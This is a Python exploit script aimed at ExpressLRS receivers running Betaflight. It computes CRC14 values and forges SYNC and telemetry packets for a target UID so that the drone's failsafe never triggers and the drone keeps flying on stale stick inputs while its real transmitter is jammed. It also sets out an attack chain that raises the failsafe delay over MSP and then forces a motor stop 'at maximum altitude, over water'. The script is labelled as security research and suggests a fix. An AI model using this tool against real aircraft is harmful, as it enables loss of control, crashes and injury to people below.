#!/usr/bin/env python3
"""
ELRS Failsafe Suppression via Non-RC Packets

Betaflight 4.4.2 (and 2026.6.2) has a critical design flaw in how
processRFPacket() handles packet types: lastValidPacketMs is refreshed
at expresslrs.c:742 BEFORE the type dispatch switch statement. This
means all CRC-valid packets — SYNC, MSP, TLM, not just RC data —
reset the signal deadline and suppress failsafe entry.

Mechanism (expresslrs.c:729-787 → rx_spi.c:188 → rx.c:535-551):

  1. processRFPacket() receives any CRC-valid OTA packet
  2. Line 742: receiver.lastValidPacketMs = millis()  ← ALL types
  3. Lines 745-768: Only RC branch copies new channel data
  4. Line 787: All recognized types return RX_SPI_RECEIVED_DATA
  5. rx_spi.c:188: RX_SPI_RECEIVED_DATA → RX_FRAME_COMPLETE
  6. rx.c:535-551: RX_FRAME_COMPLETE → signalReceived=true
  7. Signal deadline extended by 100ms
  8. failsafeOnValidDataReceived() called with STALE channel data
  9. The retained rxSpiPayload buffer still holds the last RC values

Impact:
  An attacker who can forge CRC-valid non-RC packets (only needs UID
  for CRC14 init, no model match required for connection keepalive)
  can indefinitely suppress failsafe. The drone continues flying with
  the LAST stick positions while the real TX is jammed/out of range.

  Combined with MSP_SET_FAILSAFE_CONFIG (delay=200, procedure=DROP),
  this creates a two-layer failsafe defeat: even if suppression
  packets briefly stop, the 20s delay gives time to resume.

  This is especially dangerous because:
  - Non-RC packets do NOT require model match (MSP/TLM processed
    without connectionHasModelMatch check)
  - The retained channel buffer passes pulse-validity checks
  - handleConnectionStateUpdate() also uses lastValidPacketMs,
    so connection state stays CONNECTED too

Attack timing:
  - Signal deadline: 100ms (rx.c:548-551)
  - Required packet rate: >10 Hz to sustain the deadline
  - At 150 Hz ELRS rate: 1 suppression packet per cycle = 150 Hz
  - Failsafe delay (default): 0.4s (4 × 100ms periods)
  - Modified delay (MSP attack): up to 20s (200 × 100ms)

Protocol details:
  - SYNC packet: simplest to forge (known format, carries UID bytes)
  - TLM packet: type 0x03/0x05, also triggers lastValidPacketMs
  - MSP packet: type 0x01, also triggers + delivers commands
  - All types return RX_SPI_RECEIVED_DATA indiscriminately

Confirmed in both Betaflight 4.4.2 and 2026.6.2 source.

Usage:
  python3 elrs-failsafe-suppression.py --target 11:18:5b --analyze
  python3 elrs-failsafe-suppression.py --target 11:18:5b --generate-sync
  python3 elrs-failsafe-suppression.py --target 11:18:5b --chain

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import struct
import sys
import time

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# ELRS OTA v3 constants
# ---------------------------------------------------------------------------

# Packet types in OTA v3
ELRS_PKT_RC = 0x00       # RC channel data (the ONLY type that writes new channels)
ELRS_PKT_MSP = 0x01      # MSP-over-ELRS (triggers lastValidPacketMs, no new RC)
ELRS_PKT_SYNC = 0x02     # SYNC (triggers lastValidPacketMs, no new RC)
ELRS_PKT_TLM_LINK = 0x03 # Telemetry link stats
ELRS_PKT_TLM_DATA = 0x05 # Telemetry data

# OTA frame structure
OTA_V3_FRAME_SIZE = 8     # bytes per OTA packet
CRC14_POLY = 0x2E57       # ELRS CRC-14 polynomial

# Failsafe timing
SIGNAL_DEADLINE_MS = 100   # rx.c:548 — hard-coded 100ms deadline
FAILSAFE_DELAY_DEFAULT = 4   # × 100ms = 0.4s
FAILSAFE_DELAY_MAX = 200     # × 100ms = 20.0s
FAILSAFE_PERIOD_MS = 100     # each unit of failsafe_delay

# ELRS rates
ELRS_RATES = {
    "50Hz":  {"interval_ms": 20.0, "hz": 50},
    "100Hz": {"interval_ms": 10.0, "hz": 100},
    "150Hz": {"interval_ms": 6.667, "hz": 150},
    "200Hz": {"interval_ms": 5.0, "hz": 200},
    "250Hz": {"interval_ms": 4.0, "hz": 250},
    "333Hz": {"interval_ms": 3.0, "hz": 333},
    "500Hz": {"interval_ms": 2.0, "hz": 500},
}

# Packet types that suppress failsafe (all of them)
SUPPRESSION_TYPES = {
    ELRS_PKT_RC: "RC (writes new channels — legitimate)",
    ELRS_PKT_MSP: "MSP (NO new channels, but triggers lastValidPacketMs)",
    ELRS_PKT_SYNC: "SYNC (NO new channels, but triggers lastValidPacketMs)",
    ELRS_PKT_TLM_LINK: "TLM_LINK (NO new channels, but triggers lastValidPacketMs)",
    ELRS_PKT_TLM_DATA: "TLM_DATA (NO new channels, but triggers lastValidPacketMs)",
}


def parse_target(target_str: str) -> bytes:
    """Parse UID[3]:UID[4]:UID[5] hex string."""
    parts = target_str.strip().upper().replace("-", ":").replace(" ", ":").split(":")
    if len(parts) != 3:
        raise ValueError("Target must be 3 bytes UID[3]:UID[4]:UID[5]")
    return bytes(int(p, 16) for p in parts)


def crc14_init(uid4: int, uid5: int) -> int:
    """Compute CRC14 initializer from UID[4:5] — static for entire session in v3."""
    return ((uid4 << 8) | uid5) ^ 3


def crc14_calc(data: bytes, init: int) -> int:
    """Calculate ELRS CRC-14 over data bytes with given initializer."""
    crc = init
    for byte in data:
        crc ^= byte << 6
        for _ in range(8):
            if crc & 0x2000:
                crc = (crc << 1) ^ CRC14_POLY
            else:
                crc = crc << 1
            crc &= 0x3FFF
    return crc


def build_sync_packet(uid3: int, uid4: int, uid5: int,
                      nonce: int = 0, switch_mode: int = 0) -> dict:
    """Build a SYNC suppression packet.

    SYNC is the simplest packet to forge — it's a known format and
    the attacker already has UID[3:5] from passive observation.
    """
    init = crc14_init(uid4, uid5)
    # OTA v3 SYNC layout: [type(2b)|nonce(2b)|switchMode(4b)] [UID3] [UID4] [UID5] [rateIndex] [TLMrate] [CRC14hi] [CRC14lo]
    header = ((ELRS_PKT_SYNC & 0x03) << 6) | ((nonce & 0x03) << 4) | (switch_mode & 0x0F)
    rate_index = 4   # 150 Hz
    tlm_rate = 1     # standard
    payload = bytes([header, uid3, uid4, uid5, rate_index, tlm_rate])
    # CRC14 over first 7 bytes (payload + 1 byte reserved for CRC high bits)
    crc_data = payload + b'\x00'
    crc = crc14_calc(crc_data[:7], init)

    frame = payload + bytes([(crc >> 8) & 0x3F, crc & 0xFF])

    return {
        "type": "SYNC",
        "type_id": ELRS_PKT_SYNC,
        "frame_hex": frame[:OTA_V3_FRAME_SIZE].hex(),
        "crc14_init": f"0x{init:04x}",
        "crc14": f"0x{crc:04x}",
        "writes_rc_data": False,
        "triggers_lastValidPacketMs": True,
        "suppresses_failsafe": True,
    }


def build_tlm_packet(uid4: int, uid5: int) -> dict:
    """Build a TLM link stats suppression packet."""
    init = crc14_init(uid4, uid5)
    header = ((ELRS_PKT_TLM_LINK & 0x07) << 5)
    # TLM payload is mostly telemetry data — content doesn't matter for suppression
    payload = bytes([header, 0x00, 0x00, 0x00, 0x00, 0x00])
    crc_data = payload + b'\x00'
    crc = crc14_calc(crc_data[:7], init)

    frame = payload + bytes([(crc >> 8) & 0x3F, crc & 0xFF])

    return {
        "type": "TLM_LINK",
        "type_id": ELRS_PKT_TLM_LINK,
        "frame_hex": frame[:OTA_V3_FRAME_SIZE].hex(),
        "crc14_init": f"0x{init:04x}",
        "writes_rc_data": False,
        "triggers_lastValidPacketMs": True,
        "suppresses_failsafe": True,
    }


def analyze_suppression():
    """Analyze the failsafe suppression attack timing and feasibility."""
    print(f"\n{'='*65}")
    print("FAILSAFE SUPPRESSION ANALYSIS")
    print(f"{'='*65}")

    print(f"\n  The vulnerability (expresslrs.c:742):")
    print(f"    receiver.lastValidPacketMs = millis();")
    print(f"    ↑ Updated BEFORE type dispatch — ALL packet types reset it")

    print(f"\n  Packet types and their failsafe effect:")
    print(f"  {'Type':<12s}  {'ID':>4s}  {'Writes RC':>10s}  {'Resets timer':>13s}")
    print(f"  {'-'*12}  {'-'*4}  {'-'*10}  {'-'*13}")
    for pkt_type, desc in SUPPRESSION_TYPES.items():
        writes_rc = "YES" if pkt_type == ELRS_PKT_RC else "NO"
        print(f"  {desc.split('(')[0].strip():<12s}  0x{pkt_type:02x}    {writes_rc:>8s}  {'YES':>11s}")

    print(f"\n  Signal deadline: {SIGNAL_DEADLINE_MS}ms (rx.c:548, hard-coded)")
    print(f"  Required suppression rate: >{1000/SIGNAL_DEADLINE_MS:.0f} Hz (one packet per {SIGNAL_DEADLINE_MS}ms)")

    print(f"\n  Failsafe delay timing:")
    print(f"    Default: {FAILSAFE_DELAY_DEFAULT} × {FAILSAFE_PERIOD_MS}ms = "
          f"{FAILSAFE_DELAY_DEFAULT * FAILSAFE_PERIOD_MS}ms ({FAILSAFE_DELAY_DEFAULT * FAILSAFE_PERIOD_MS / 1000:.1f}s)")
    print(f"    Max (via MSP attack): {FAILSAFE_DELAY_MAX} × {FAILSAFE_PERIOD_MS}ms = "
          f"{FAILSAFE_DELAY_MAX * FAILSAFE_PERIOD_MS}ms ({FAILSAFE_DELAY_MAX * FAILSAFE_PERIOD_MS / 1000:.1f}s)")

    print(f"\n  Suppression budget per ELRS rate:")
    print(f"  {'Rate':>8s}  {'Interval':>10s}  {'Pkts/100ms':>11s}  {'Margin':>8s}")
    print(f"  {'-'*8}  {'-'*10}  {'-'*11}  {'-'*8}")
    for name, info in ELRS_RATES.items():
        pkts_per_deadline = SIGNAL_DEADLINE_MS / info["interval_ms"]
        margin = f"{pkts_per_deadline:.1f}x"
        print(f"  {name:>8s}  {info['interval_ms']:>8.1f}ms  {pkts_per_deadline:>9.1f}  {margin:>8s}")

    print(f"\n  At 150 Hz (TinyHawk): {SIGNAL_DEADLINE_MS / 6.667:.1f} packets per signal deadline")
    print(f"  Even at 50 Hz: {SIGNAL_DEADLINE_MS / 20.0:.1f} packets per deadline — still 5x margin")
    print(f"  A SINGLE non-RC packet per 100ms window keeps failsafe suppressed")

    print(f"\n  What the retained buffer does:")
    print(f"    - rxSpiPayload (rx_spi.c:58) persists between calls")
    print(f"    - expressLrsSetRcDataFromPayload() unpacks whatever is there")
    print(f"    - Last legitimate stick positions pass pulse-validity checks")
    print(f"    - Drone holds its last commanded attitude/throttle indefinitely")


def analyze_chain():
    """Analyze the combined failsafe suppression + MSP manipulation chain."""
    print(f"\n{'='*65}")
    print("COMBINED ATTACK CHAIN: FAILSAFE DEFEAT")
    print(f"{'='*65}")

    steps = [
        {
            "name": "Phase 1: Maximize failsafe window",
            "command": "MSP_SET_FAILSAFE_CONFIG",
            "detail": "Set failsafe_delay=200 (20s), failsafe_procedure=DROP",
            "timing": "1 MSP-over-ELRS packet (5 bytes payload)",
            "effect": "Even if suppression briefly fails, 20s grace period",
        },
        {
            "name": "Phase 2: Begin FHSS-synchronized suppression",
            "command": "SYNC replay stream",
            "detail": "Forge SYNC packets on correct FHSS channels at >10 Hz",
            "timing": "Continuous, 1 per FHSS hop minimum",
            "effect": "lastValidPacketMs resets every hop, failsafe timer frozen",
        },
        {
            "name": "Phase 3: Jam legitimate TX",
            "command": "Broadband 2.4 GHz interference",
            "detail": "Overwhelm legitimate TX signal (or FHSS-targeted jam)",
            "timing": "Concurrent with Phase 2",
            "effect": "Real RC data stops arriving; drone runs on stale channels",
        },
        {
            "name": "Phase 4: Sustained flight on stale channels",
            "command": "None (passive effect)",
            "detail": "Drone continues at last stick positions (throttle, pitch, roll, yaw)",
            "timing": "Indefinite while suppression packets arrive",
            "effect": "Uncontrolled flight path — drift, collision, loss of vehicle",
        },
        {
            "name": "Phase 5: Optional escalation",
            "command": "MSP_SET_ARMING_DISABLED / MSP_REBOOT",
            "detail": "Once damage is done, force disarm or reboot",
            "timing": "1 MSP packet",
            "effect": "Motor stop at chosen moment (maximum altitude, over water, etc.)",
        },
    ]

    total_packets = 0
    for i, step in enumerate(steps):
        print(f"\n  Step {i+1}: {step['name']}")
        print(f"    Command: {step['command']}")
        print(f"    Detail:  {step['detail']}")
        print(f"    Timing:  {step['timing']}")
        print(f"    Effect:  {step['effect']}")

    print(f"\n  CRITICAL DISTINCTION:")
    print(f"    - Failsafe suppression does NOT require model match")
    print(f"    - SYNC/TLM packets trigger lastValidPacketMs regardless")
    print(f"    - Only RC channel WRITING requires connectionHasModelMatch")
    print(f"    - MSP processing requires connectionState==CONNECTED")
    print(f"    - But connection state itself is sustained by ANY valid packet")

    print(f"\n  DEFENSE GAPS IN BETAFLIGHT 4.4.2:")
    print(f"    1. No per-type packet counting (can't detect RC drought)")
    print(f"    2. No timestamp check on RC freshness vs signal deadline")
    print(f"    3. failsafeOnValidDataReceived() trusts RX_FRAME_COMPLETE blindly")
    print(f"    4. No rate-limiting on failsafe timer resets")
    print(f"    5. Retained buffer pattern means stale data looks valid")

    print(f"\n  CONFIRMED IN 2026.6.2:")
    print(f"    Same pattern at expresslrs.c:811-875 — unfixed as of latest release")


def main():
    parser = argparse.ArgumentParser(
        description="ELRS Failsafe Suppression via Non-RC Packets"
    )
    parser.add_argument(
        "--target", required=True,
        help="Target UID[3]:UID[4]:UID[5] (hex, colon-separated)",
    )
    parser.add_argument(
        "--analyze", action="store_true",
        help="Detailed analysis of the suppression mechanism",
    )
    parser.add_argument(
        "--generate-sync", action="store_true",
        help="Generate suppression SYNC packets for the target",
    )
    parser.add_argument(
        "--generate-tlm", action="store_true",
        help="Generate suppression TLM packets for the target",
    )
    parser.add_argument(
        "--chain", action="store_true",
        help="Analyze the combined failsafe defeat attack chain",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
    )
    args = parser.parse_args()

    target = parse_target(args.target)
    uid3, uid4, uid5 = target
    target_hex = f"{uid3:02x}:{uid4:02x}:{uid5:02x}"
    init = crc14_init(uid4, uid5)

    print("ELRS Failsafe Suppression — Non-RC Packet Attack")
    print(f"Target UID[3:5]: {target_hex}")
    print(f"CRC14 initializer: 0x{init:04x} (derived from UID[4:5])")
    print(f"Signal deadline: {SIGNAL_DEADLINE_MS}ms")
    print(f"Required suppression rate: >{1000/SIGNAL_DEADLINE_MS:.0f} Hz")

    results = {
        "target": target_hex,
        "crc14_init": f"0x{init:04x}",
        "signal_deadline_ms": SIGNAL_DEADLINE_MS,
        "min_suppression_rate_hz": 1000 / SIGNAL_DEADLINE_MS,
    }

    if args.analyze:
        analyze_suppression()
        results["mode"] = "analyze"

    if args.generate_sync:
        print(f"\n{'='*65}")
        print("SYNC SUPPRESSION PACKETS")
        print(f"{'='*65}")
        packets = []
        for nonce in range(4):
            pkt = build_sync_packet(uid3, uid4, uid5, nonce=nonce)
            packets.append(pkt)
            print(f"\n  Nonce {nonce}: {pkt['frame_hex']}")
            print(f"    CRC14: {pkt['crc14']}")
            print(f"    Writes RC: {pkt['writes_rc_data']}")
            print(f"    Suppresses failsafe: {pkt['suppresses_failsafe']}")
        results["sync_packets"] = packets
        results["mode"] = "generate-sync"
        print(f"\n  4 SYNC variants (nonce 0-3), any one keeps failsafe suppressed")
        print(f"  Rotate nonces to match expected ELRS nonce tracking")

    if args.generate_tlm:
        print(f"\n{'='*65}")
        print("TLM SUPPRESSION PACKET")
        print(f"{'='*65}")
        pkt = build_tlm_packet(uid4, uid5)
        print(f"\n  TLM_LINK: {pkt['frame_hex']}")
        print(f"    CRC14 init: {pkt['crc14_init']}")
        print(f"    Writes RC: {pkt['writes_rc_data']}")
        print(f"    Suppresses failsafe: {pkt['suppresses_failsafe']}")
        results["tlm_packet"] = pkt
        results["mode"] = "generate-tlm"

    if args.chain:
        analyze_chain()
        results["mode"] = "chain"

    if not any([args.analyze, args.generate_sync, args.generate_tlm, args.chain]):
        analyze_suppression()
        analyze_chain()

    # Assessment
    print(f"\n{'='*65}")
    print("ASSESSMENT")
    print(f"{'='*65}")
    print("  This is a DESIGN vulnerability, not an implementation bug.")
    print("  The root cause is updating lastValidPacketMs before type")
    print("  dispatch — a deliberate choice for connection keepalive that")
    print("  has the side effect of suppressing safety-critical failsafe.")
    print()
    print("  The fix would be to only call failsafeOnValidDataReceived()")
    print("  when actual RC channel data is written, and to track RC-specific")
    print("  freshness separately from connection liveness. This has NOT been")
    print("  implemented in any released Betaflight version through 2026.6.2.")
    print()
    print("  Combined with MSP_SET_FAILSAFE_CONFIG manipulation, this gives")
    print("  an attacker TWO independent layers of failsafe defeat — making")
    print("  the drone fly indefinitely on stale stick inputs while jammed.")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
